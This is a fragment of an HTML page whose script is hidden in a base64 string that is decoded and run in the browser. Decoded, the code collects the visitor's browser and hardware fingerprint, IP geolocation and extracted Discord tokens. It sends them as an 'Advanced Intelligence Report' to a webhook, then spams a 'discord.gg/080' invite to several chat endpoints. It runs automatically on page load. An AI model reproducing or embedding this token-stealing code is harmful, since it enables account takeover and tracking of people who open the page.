IGlubGluZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiAiU3lzdGVtIEZpbmdlcnByaW50IiwKICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGAqKkJyb3dzZXI6KiogJHtzeXN0ZW1EYXRhLnNvZnR3YXJlLmJyb3dzZXJ9CioqT1M6KiogJHtzeXN0ZW1EYXRhLnNvZnR3YXJlLm9zfQoqKlNjcmVlbjoqKiAke3N5c3RlbURhdGEuZmluZ2VycHJpbnQuc2NyZWVufQoqKkNvcmVzOioqICR7c3lzdGVtRGF0YS5oYXJkd2FyZS5jb3Jlc30KKipNZW1vcnk6KiogJHtzeXN0ZW1EYXRhLmhhcmR3YXJlLm1lbW9yeX1gLAogICAgICAgICAgICAgICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogIkV4dHJhY3RlZCBUb2tlbnMgUHJldmlldyIsCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiBkaXNjb3JkRGF0YS50b2tlbnMubGVuZ3RoID4gMCA/IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYFxgXGBcYCR7ZGlzY29yZERhdGEudG9rZW5zLnNsaWNlKDAsIDUpLmpvaW4oJ1xuJyl9XGBcYFxgYCA6IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIk5vIHRva2VucyBleHRyYWN0ZWQiLAogICAgICAgICAgICAgICAgICAgICAgICBpbmxpbmU6IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgIGZvb3RlcjogeyAKICAgICAgICAgICAgICAgICAgICB0ZXh0OiAiQWR2YW5jZWQgSW50ZWxsaWdlbmNlIFJlcG9ydCDigKIgZGlzY29yZC5nZy8wODAiIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGF3YWl0IGZldGNoKHdlYmhvb2tVcmwsIHsKICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7J0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJ30sCiAgICAgICAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBlbWJlZHM6IFtlbWJlZF0gfSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignRXJyb3Igc2VuZGluZyByZXBvcnQ6JywgZXJyb3IpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIGZldGNoKCdodHRwczovL2lwaW5mby5pby9qc29uJykKICAgICAgICAgICAgICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLmpzb24oKSkKICAgICAgICAgICAgICAgIC50aGVuKGRhdGEgPT4gewogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpcC1pbmZvJykuaW5uZXJIVE1MID0gCiAgICAgICAgICAgICAgICAgICAgICAgIGBJUDogJHtkYXRhLmlwfVxuQ2l0eTogJHtkYXRhLmNpdHl9XG5SZWdpb246ICR7ZGF0YS5yZWdpb259XG5Db3VudHJ5OiAke2RhdGEuY291bnRyeX1cbkxvY2F0aW9uOiAke2RhdGEubG9jfVxuVGltZXpvbmU6ICR7ZGF0YS50aW1lem9uZX1gOwogICAgICAgICAgICAgICAgICAgIHN0YXJ0UHJvY2VzcygpOwogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIC5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lwLWluZm8nKS5pbm5lckhUTUwgPSAnRXJyb3IgbG9hZGluZyBpbmZvcm1hdGlvbic7CiAgICAgICAgICAgICAgICAgICAgc3RhcnRQcm9jZXNzKCk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICB9KTsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2UgPSBgZGlzY29yZC5nZy8wODBgOwogICAgICAgICAgICBjb25zdCBlbmRwb2ludHMgPSBbCiAgICAgICAgICAgICAgICAiaHR0cHM6Ly9mbGl4LXNjcmlwdHMvY2hhdFJlc3VsdCIsCiAgICAgICAgICAgICAgICAiaHR0cHM6Ly9kYW5nZXJfY2hhdC9EYW5nZXJfQ2hhdDpTZW5kTWVzc2FnZSIsCiAgICAgICAgICAgICAgICAiaHR0cHM6Ly9lYXN5LWNoYXQrL282WmJLNUVjcDYiLCAKICAgICAgICAgICAgICAgICJodHRwczovL21lbGl4X2NoYXQvY2hhdFJlc3VsdCIsCiAgICAgICAgICAgICAgICAiaHR0cHM6Ly9hc19jaGF0L2NoYXRSZXN1bHQiLAogICAgICAgICAgICAgICAgImh0dHBzOi8vY2hhdC9jaGF0UmVzdWx0IiwKICAgICAgICAgICAgICAgICJodHRwczovL2hvLWNoYXR2Mi9DaGF0IgogICAgICAgICAgICBdOwoKICAgICAgICAgICAgZW5kcG9pbnRzLmZvckVhY2goZW5kcG9pbnQgPT4gewogICAgICAgICAgICAgICAgZmV0Y2goZW5kcG9pbnQsIHsKICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7J0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJ30sCiAgICAgICAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoe21lc3NhZ2U6IG1lc3NhZ2V9KQogICAgICAgICAgICAgICAgfSkuY2F0Y2goZSA9PiBjb25zb2xlLmxvZyhlKSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0sIDMwMDApOwoKICAgIDwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4="));
</script>
</head>
</html>
